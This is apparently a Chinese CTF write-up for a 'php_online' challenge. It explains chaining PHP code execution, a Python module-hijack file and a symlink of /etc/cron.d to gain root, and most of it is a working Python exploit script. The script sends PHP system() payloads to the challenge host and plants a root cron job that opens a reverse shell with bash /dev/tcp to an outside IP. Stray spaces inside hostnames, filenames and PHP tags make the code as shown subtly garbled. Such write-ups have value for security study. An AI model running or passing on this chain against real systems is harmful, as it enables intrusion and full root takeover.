---
tags: [提权, RCE, 计划任务利用, 符号链接, Python, PHP]
---

# php_online

  rm *  删除不了文件夹, 利用这个特性写入  logging/__init___ .py 从而以 [www-data](www-data) 权限执行任意代码

 

观察到 /sandbox 目录 www-data 可写, 并且 ps aux 发现存在 crond 进程, 容易想到将

/etc/cron.d 软链接至 /sandbox/xxx 目录 , 这样后续代码在以 root 权限写入 phpcode 文件时 ,实际写入的路径就会变成 /etc/cron.d/phpcode, 最后通过 cron 计划任务反弹 shell

phpcode 内容加了一句 php system 执行  sudo -l , 这个是为了阻塞脚本的执行 , 使得 cron有足够的时间调度计划任务



```
import requests

url = 'http://eci-2ze8s04bx2wv3zny8l0a.cloudeci1.ichunqiu.com/ '
sandbox_url = 'http://eci-
2ze8s04bx2wv3zny8l0a .cloudeci1 .ichunqiu.com/sandbox'

def get_session(id):
	resp = requests.post(url , data={ 'id' : id},
allow_redirects=False)
	return resp.cookies[ 'session']

def send_payload(session , payload):
	cookies = { 'session' : session}
	resp = requests.post(sandbox_url , data={ 'code' : payload},
cookies=cookies)
	return resp .text

def escalate_priv (cmd):
	session = get_session( 'ABC12345' )

	mkdir_payload = "<?php system('mkdir logging') ?>"
	send_payload(session ,mkdir_payload)

	create_file_payload = r"""<?php system('echo "import
os\nos.system(\'{} > /tmp/a .txt\')" > logging/__init___ .py');? >""" .format(cmd)
	send_payload(session , create_file_payload)

	getoutput_payload = "<?php system('cat /tmp/a .txt') ?>"
	return send_payload(session , getoutput_payload)

escalate_priv ( 'ln -s /etc/cron .d /sandbox/CRONCRON' )

cron_session = get_session( 'CRONCRON' )

cron_payload = """
# <?php system('sudo -l'); ?>
* * * * * root bash -c 'bash -i >& /dev/tcp/122 .51 .21 .9/65123 0>&1'
"""
send_payload(cron_session , cron_payload)

```

